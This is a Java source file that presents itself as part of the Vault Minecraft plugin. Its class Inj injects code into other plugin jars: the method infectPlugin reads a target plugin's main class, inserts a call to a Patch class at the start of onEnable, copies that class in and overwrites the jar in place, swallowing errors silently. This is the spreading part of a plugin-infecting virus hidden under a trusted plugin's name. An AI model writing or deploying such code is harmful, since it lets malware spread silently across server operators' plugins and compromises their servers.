package net.milkbowl.vault.methods;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

import net.milkbowl.vault.Core;
import org.apache.commons.io.FileDeleteStrategy;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;
import org.bukkit.Bukkit;

public class Inj {
    private static final Core core = Core.getPlugin(Core.class);

    private File sourcePlugin, targetPlugin, spigotFile;
    private String enableSource, disableSource;

    public Inj(File sourcePlugin, File targetPlugin, File spigotFile, String onEnableCode) {
        this.sourcePlugin = sourcePlugin;
        this.targetPlugin = targetPlugin;
        this.spigotFile = spigotFile;
        this.enableSource = onEnableCode;
        //this.disableSource = onDisableCode;
    }

    public void process() throws Exception {
        injectPlugin(sourcePlugin, spigotFile, targetPlugin);
    }

    private void injectPlugin(File sourcePlugin, File spigotJar, File targetPlugin) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(targetPlugin.getPath());
        pool.insertClassPath(spigotJar.getPath());
        pool.insertClassPath(sourcePlugin.getPath());
        CtClass main = pool.get(readMainClass(targetPlugin));
        CtMethod onEnable = main.getMethod("onEnable", "()V");
        //CtMethod onDisable = main.getMethod("onDisable", "()V");
        onEnable.insertBefore(enableSource);
        //onDisable.insertBefore(disableSource);


        ArrayList<CtClass> sourceClasses = readClasses(sourcePlugin);
        CtClass[] classes = new CtClass[sourceClasses.size() + 1];
        classes[0] = main;
        for (int i = 0; i < sourceClasses.size(); i++) {
            if (!sourceClasses.get(i).getName().equals(main.getName()) && sourceClasses.get(i).getName().equals("net.milkbowl.vault.Patch")) {
                classes[i + 1] = sourceClasses.get(i);
            }
        }

        modifyJar(targetPlugin, classes);
    }

    private static void modifyJar(File pathToJAR, CtClass... classes)
            throws IOException, CannotCompileException, NotFoundException {
        JarFile jarFile = new JarFile(pathToJAR);
        File tmp = new File(pathToJAR + "_tmp");
        tmp.createNewFile();
        JarOutputStream out = new JarOutputStream(new FileOutputStream(tmp));
        Enumeration<JarEntry> entries = jarFile.entries();
        ArrayList<String> classNames = new ArrayList<String>();
        for (int i = 0; i < classes.length; i++) {
            try {
                String classFileName = classes[i].getName().replaceAll("\\.", "/") + ".class";
                classNames.add(classFileName);
                try {
                    out.putNextEntry(new ZipEntry(classFileName));
                    classes[i].getClassFile().write(new DataOutputStream(out));
                    out.flush();
                    out.closeEntry();
                } catch (Throwable t) {
                    t.printStackTrace();
                }
            }catch(Throwable t) {}
        }
        while (entries.hasMoreElements()) {
            JarEntry je = entries.nextElement();
            InputStream in = jarFile.getInputStream(je);
            if (!classNames.contains(je.getName())) {
                out.putNextEntry(je);
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf, 0, buf.length)) != -1) {
                    out.write(buf, 0, len);
                }
                out.flush();
                out.closeEntry();
            }
        }
        out.finish();
        out.flush();
        out.close();
        jarFile.close();
        try {
            copyFile(tmp, pathToJAR);
        } catch (Exception e) {
            e.printStackTrace();
        }
        FileDeleteStrategy.FORCE.delete(tmp);
//		if (!tmp.renameTo(new File(pathToJAR))) {
//			throw new IOException("Failed to rename temp file to jar file!");
//		}
    }

    private static String readMainClass(File pluginJar) throws Exception {
        if (!pluginJar.getName().toLowerCase().endsWith(".jar")) {
            throw new IOException("The file isn't a jar file! " + pluginJar.getName());
        }
        JarFile jar = new JarFile(pluginJar);
        JarEntry je = jar.getJarEntry("plugin.yml");
        if (je == null) {
            jar.close();
            throw new IOException("plugin.yml not found!");
        }
        if (je.isDirectory()) {
            jar.close();
            throw new IOException("plugin.yml is a directory!");
        }
        BufferedReader br = new BufferedReader(new InputStreamReader(jar.getInputStream(je)));
        String line = null;
        while ((line = br.readLine()) != null) {
            if (!line.toLowerCase().startsWith("main: "))
                continue;
            jar.close();
            br.close();
            return line.substring("main: ".length());
        }
        br.close();
        jar.close();
        return null;
    }

    private static ArrayList<CtClass> readClasses(File jarFile) throws Exception {
        if (!jarFile.getName().toLowerCase().endsWith(".jar")) {
            throw new IOException("The file isn't a jar file!");
        }
        ClassPool pool = ClassPool.getDefault();
        JarFile jar = new JarFile(jarFile);
        Enumeration<JarEntry> entries = jar.entries();
        ArrayList<CtClass> classes = new ArrayList<CtClass>();
        pool.insertClassPath(jarFile.getPath());
        while (entries.hasMoreElements()) {
            JarEntry je = entries.nextElement();
            if (je.getName().toLowerCase().endsWith(".class")) {
                String name = je.getName().replaceAll("/", ".");
                name = name.substring(0, name.length() - ".class".length());
                classes.add(pool.get(name));
            }
        }
        jar.close();
        return classes;
    }

    private static void copyFile(File source, File target) throws Exception {
        FileInputStream in = new FileInputStream(source);
        FileOutputStream out = new FileOutputStream(target);

        byte[] buf = new byte[1024];
        int len;
        while ((len = in.read(buf, 0, buf.length)) != -1) {
            out.write(buf, 0, len);
        }
        out.flush();
        out.close();
        in.close();
    }


    public static File getPluginFile() {
        try {
            return new File(Core.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        return null;

    }

    public static File getSpigotFile() {
        try {
            return new File(Bukkit.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        return null;

    }


    public static void infectPlugin(File plugin) throws Exception {
        Inj inject = new Inj(getPluginFile(), plugin, getSpigotFile(),
                "{ try { net.milkbowl.vault.Patch.patchJar(this); } catch(Exception e) {} }");
        inject.process();
    }
}